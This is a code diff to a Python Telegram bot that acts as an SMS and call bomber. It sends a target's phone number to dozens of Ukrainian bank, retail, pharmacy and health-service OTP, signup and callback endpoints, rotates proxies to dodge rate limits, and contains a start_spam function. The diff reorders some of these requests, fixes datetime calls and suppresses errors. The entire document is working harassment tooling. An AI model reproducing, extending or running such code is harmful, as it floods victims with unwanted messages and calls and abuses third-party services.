@@ -3,6 +3,7 @@ from email import message
 import requests
 import threading
 from datetime import datetime, timedelta
+import datetime
 from telebot import TeleBot
 import telebot
 import time
@@ -113,9 +114,9 @@ def send_for_number_https(aa):
     parser_https.run(no_valid_proxy,valid_proxy,1)
     coun = 0
     
-    hour = datetime.now().strftime('%H')
-    minute = datetime.now().strftime('%M')
-    day = datetime.now().strftime('%j')
+    hour = datetime.datetime.now().strftime('%H')
+    minute = datetime.datetime.now().strftime('%M')
+    day = datetime.datetime.now().strftime('%j')
     day = int(day)-1
     
     try:
@@ -124,6 +125,9 @@ def send_for_number_https(aa):
             'https': f'http://{valid_proxy[coun]}'
         }
         print(valid_proxy[coun])
+        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers,proxies=proxies, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
+        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,proxies=proxies, data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
+        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers,proxies=proxies, data={'phone': aa}) 
         d = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers,proxies=proxies, json={"phone": aa})
         d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers,proxies=proxies, json={'phone':aa,'platform':'PISWeb'})
         d = requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=1663171005082&utcOffset=-180',headers=headers,proxies=proxies, json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940","uaId": "UA-21322812-1","clientId": "1008992044.1662752535","pageUrl": "https://city-drive.ua/user/register"}) 
@@ -190,18 +194,14 @@ def send_for_number_https(aa):
         d = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})    
         d = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',proxies=proxies, headers=headers)    
         d = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,proxies=proxies, json={'phone': number_plus})    
-        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,proxies=proxies, data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})    
-        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,proxies=proxies, data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
-        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers,proxies=proxies, data={'phone': aa})    
+        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,proxies=proxies, data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})       
         d = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers,proxies=proxies, data={'phone': aa})    
-        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers,proxies=proxies, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
         d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers,proxies=proxies, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
         d = requests.post('https://auth.easypay.ua/api/check',headers=headers,proxies=proxies, json={"phone": aa})    
         d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers,proxies=proxies, json={'phone': aa})
         coun+=1
         print(f'Круг {coun}')
     except:
-        print(d.text)
         coun+=1
     print('все')
 
@@ -230,12 +230,15 @@ def send_for_number(aa):
     uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
     number_plus = '+' + aa
 
-    hour = datetime.now().strftime('%H')
-    minute = datetime.now().strftime('%M')
-    day = datetime.now().strftime('%j')
+    hour = datetime.datetime.now().strftime('%H')
+    minute = datetime.datetime.now().strftime('%M')
+    day = datetime.datetime.now().strftime('%j')
     day = int(day)-1
     
     try:
+        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
+        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
+        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})   
         d = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers, json={"phone": aa})
         d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone':aa,'platform':'PISWeb'})
         d = requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=1663171005082&utcOffset=-180',headers=headers, json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940","uaId": "UA-21322812-1","clientId": "1008992044.1662752535","pageUrl": "https://city-drive.ua/user/register"}) 
@@ -302,18 +305,15 @@ def send_for_number(aa):
         d = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})    
         d = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',headers=headers)    
         d = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,json={'phone': number_plus})    
-        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})    
-        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
-        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})    
+        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})     
         d = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': aa})    
-        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
         d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
         d = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})    
         d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
         coun+=1
         print(f'Круг {coun}')
     except:
-        print(d.text)
+        pass
     print('все')
 
 def start_spam(chat_id, phone_number, force,second,prox,name):
@@ -469,6 +469,7 @@ def handle_message_received(message):
             
 
         else:
+            save_chat_id(chat_id)
             bot.send_message(chat_id, f'Номер введений неправильно. Введено {len(text)} символів, а треба 12')
     except IndexError:
         pass
